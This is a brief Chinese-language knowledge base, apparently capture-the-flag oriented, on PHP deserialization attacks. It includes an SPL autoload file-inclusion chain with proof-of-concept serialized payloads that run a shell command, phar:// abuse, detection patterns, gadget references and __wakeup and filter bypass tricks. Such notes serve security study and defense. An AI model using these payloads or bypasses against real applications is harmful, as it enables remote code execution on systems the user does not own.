# PHP反序列化漏洞知识库

## 攻击技术

### SPL Autoload 文件包含链

**触发条件**：
- `unserialize_callback_func` 设置为 `spl_autoload`
- 存在可控制的配置项
- `spl_autoload` 会尝试加载 `{类名}.inc` 或 `{类名}.php`

**攻击步骤**：
1. 利用 `__wakeup()` 设置 `unserialize_callback_func=spl_autoload`
2. 利用 `__destruct()` 写入恶意代码到 `settings.inc`
3. 反序列化不存在的类 `settings` 触发 `spl_autoload` 包含

**POC生成**：
```php
// Step 1: 写入代码
$inner = serialize("<?php system('cat /flag');");
$payload = 'O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:' . strlen($inner) . ':"' . $inner . '"}';

// Step 2: 触发
$payload = 'O:4:"main":2:{s:8:"settings";a:1:{s:25:"unserialize_callback_func";s:12:"spl_autoload";}s:6:"params";s:19:"O:8:\"settings\":0:{}"}';
```

### PHAR利用

当文件操作函数（如 `file_exists`, `fopen`）接受phar://时：
```php
phar://path/to/phar.phar
```

## 检测特征

1. `__wakeup()` 中使用 `ini_set`
2. `__destruct()` 中使用 `file_put_contents`
3. `unserialize()` 嵌套
4. 类名与文件名关联（如 `settings.inc`）

## 常见Gadgets

参考 [PHPGGC](https://github.com/ambionics/phpggc):
- Laravel
- Symfony
- Zend Framework
- WordPress

## 防御绕过

### 绕过`__wakeup`
- CVE-2016-7124: 对象属性数量不匹配时`__wakeup`不执行
- 修改序列化字符串中的对象数量

### 绕过字符过滤
- `+` 号绕过 (URL编码为 `%2B`)
- 大写/小写类名
